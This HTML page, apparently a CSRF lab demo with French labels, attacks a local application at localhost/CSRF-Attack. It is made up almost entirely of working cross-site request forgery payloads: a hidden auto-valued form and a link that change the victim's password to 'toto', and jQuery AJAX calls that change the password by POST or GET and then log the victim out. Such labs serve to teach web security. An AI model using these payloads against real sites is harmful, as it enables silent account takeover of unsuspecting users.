<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    </head>
    <script>
        function changePwdPost(){
            $.ajax({
                url : 'http://localhost/CSRF-Attack/change/password',
                type : 'POST', 
                data : { 
                    password : 'toto'
                }
            })
            .done(function(res) {
                $.ajax({
                    url : 'http://localhost/CSRF-Attack/logout'
                })
            });        
        }
        function changePwdGet(){
            $.ajax({
                url : 'http://localhost/CSRF-Attack/change/password/level2?pwd=toto2'
            })
            .done(function(res) {
                $.ajax({
                    url : 'http://localhost/CSRF-Attack/logout'
                })
            });        
        }

        $(document).ready(function(){ 
            $('#hack-post').on("click", function(){
                changePwdPost();
            });

            $('#hack-get').on("click", function(){
                changePwdGet();
            });
        });
            
    </script>
    <body>
        <h1>Sans ajax</h1>
        <form action="http://localhost/CSRF-Attack/change/password" method="POST">
            <input type="hidden" name="password" value="toto"/>
            <input type="submit" value="Montre moi ce que tu veux"/>
        </form>
        <br>
        <a href="http://localhost/CSRF-Attack/change/password/level2?pwd=toto2">Tu veux perdre ton compte ?</a>
        <hr>
        <h1>Ajax</h1>
        <button id="hack-post">Hack toi en postant</button>
        <br>
        <button id="hack-get">Hack toi en gettant</button>
    </body>
</html>